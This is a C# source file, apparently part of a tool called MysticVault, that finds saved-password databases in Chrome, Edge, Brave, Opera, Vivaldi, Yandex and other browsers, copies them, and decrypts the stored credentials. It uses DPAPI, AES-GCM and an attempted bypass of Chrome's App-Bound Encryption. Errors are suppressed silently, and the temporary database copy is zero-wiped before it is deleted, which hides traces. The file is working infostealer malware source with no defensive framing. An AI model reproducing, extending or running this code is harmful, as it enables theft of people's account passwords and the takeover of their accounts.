using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace MysticVault;

public class AppBoundEncryptionException : Exception
{
    public AppBoundEncryptionException(string message) : base(message) { }
}

public record ExtractedCredential(string Url, string Username, string Password);

public static class BrowserData
{
    public static readonly (string Name, string UserDataPath, string LocalStatePath, string ExePath)[] Browsers =
    {
        ("Chrome", @"Google\Chrome\User Data", @"Google\Chrome\User Data\Local State", @"Google\Chrome\Application\chrome.exe"),
        ("Edge", @"Microsoft\Edge\User Data", @"Microsoft\Edge\User Data\Local State", @"Microsoft\Edge\Application\msedge.exe"),
        ("Brave", @"BraveSoftware\Brave-Browser\User Data", @"BraveSoftware\Brave-Browser\User Data\Local State", @"BraveSoftware\Brave-Browser\Application\brave.exe"),
        ("Opera", @"Opera Software\Opera Stable", @"Opera Software\Opera Stable\Local State", @"Opera\launcher.exe"),
        ("Opera GX", @"Opera Software\Opera GX Stable", @"Opera Software\Opera GX Stable\Local State", @"Opera GX\launcher.exe"),
        ("Vivaldi", @"Vivaldi\User Data", @"Vivaldi\User Data\Local State", @"Vivaldi\Application\vivaldi.exe"),
        ("Yandex", @"Yandex\YandexBrowser\User Data", @"Yandex\YandexBrowser\User Data\Local State", @"Yandex\YandexBrowser\Application\browser.exe"),
        ("Chromium", @"Chromium\User Data", @"Chromium\User Data\Local State", @"Chromium\Application\chrome.exe"),
    };
}

public class BrowserExtractor
{
    public static List<ExtractedCredential> ExtractAll()
    {
        var credentials = new List<ExtractedCredential>();
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        foreach (var browser in BrowserData.Browsers)
        {
            string userDataPath = Path.Combine(localAppData, browser.UserDataPath);
            if (!Directory.Exists(userDataPath)) continue;
            try
            {
                credentials.AddRange(ExtractFromBrowser(userDataPath, browser.LocalStatePath, browser.ExePath));
            }
            catch { }
        }

        try { credentials.AddRange(ZenExtractor.ExtractAll()); }
        catch { }
        try { credentials.AddRange(FirefoxExtractor.ExtractAll()); }
        catch { }

        return credentials;
    }

    public static List<ExtractedCredential> ExtractFromBrowser(string userDataPath, string localStatePath, string exePath)
    {
        var results = new List<ExtractedCredential>();
        string fullLsp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), localStatePath);
        string loginDataPath = Path.Combine(userDataPath, @"Default\Login Data");
        if (!File.Exists(loginDataPath))
            loginDataPath = Path.Combine(userDataPath, "Login Data");
        if (!File.Exists(fullLsp) || !File.Exists(loginDataPath))
            return results;

        byte[]? masterKey = GetMasterKey(fullLsp, exePath);
        if (masterKey == null) return results;

        string tempDbPath = Path.GetTempFileName();
        try
        {
            File.Copy(loginDataPath, tempDbPath, true);
            using var connection = new SqliteConnection($"Data Source={tempDbPath}");
            connection.Open();
            var command = connection.CreateCommand();
            command.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var reader = command.ExecuteReader();
            while (reader.Read())
            {
                string url = reader.GetString(0);
                string username = reader.GetString(1);
                byte[] encryptedPassword = (byte[])reader.GetValue(2);
                if (encryptedPassword != null && encryptedPassword.Length > 0)
                {
                    string password = DecryptPassword(encryptedPassword, masterKey);
                    if (!string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(username))
                        results.Add(new ExtractedCredential(url, username, password));
                }
            }
        }
        catch { }
        finally
        {
            if (File.Exists(tempDbPath))
            {
                try
                {
                    var fi = new FileInfo(tempDbPath);
                    if (fi.Exists)
                    {
                        byte[] buffer = new byte[fi.Length];
                        using (var fs = new FileStream(tempDbPath, FileMode.Open, FileAccess.Write, FileShare.None))
                            fs.Write(buffer, 0, buffer.Length);
                    }
                    File.Delete(tempDbPath);
                }
                catch { }
            }
        }
        return results;
    }

    internal static byte[]? GetMasterKey(string localStatePath, string exePath)
    {
        string? b64Key = ChromeElevationServiceProxy.TryGetMasterKeyFromChromeAppBoundKey(localStatePath, exePath);
        if (b64Key != null)
            return Convert.FromBase64String(b64Key);

        try
        {
            string content = File.ReadAllText(localStatePath);
            using var document = JsonDocument.Parse(content);
            if (document.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
                osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
            {
                string encryptedKeyB64 = encryptedKeyElement.GetString() ?? "";
                byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKeyB64);
                string prefix = Encoding.ASCII.GetString(encryptedKeyBytes, 0, 4);
                if (prefix == "APPB")
                    throw new AppBoundEncryptionException("Chrome v127+ App-Bound Encryption detected and proxy unavailable.");

                byte[] dpapiEncryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, dpapiEncryptedKey, 0, dpapiEncryptedKey.Length);
                return ProtectedData.Unprotect(dpapiEncryptedKey, null, DataProtectionScope.CurrentUser);
            }
        }
        catch (AppBoundEncryptionException) { throw; }
        catch { }

        return null;
    }

    internal static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
    {
        try
        {
            if (encryptedData.Length >= 3 && encryptedData[0] == 'v' &&
                (encryptedData[1] == '1' && (encryptedData[2] == '0' || encryptedData[2] == '1')))
            {
                byte[] iv = new byte[12];
                Array.Copy(encryptedData, 3, iv, 0, 12);
                byte[] ciphertext = new byte[encryptedData.Length - 15 - 16];
                Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
                byte[] tag = new byte[16];
                Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
                byte[] plaintext = new byte[ciphertext.Length];
                using var aesGcm = new AesGcm(masterKey, tag.Length);
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext);
            }
            else
            {
                byte[] plaintext = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(plaintext);
            }
        }
        catch
        {
            return string.Empty;
        }
    }
}
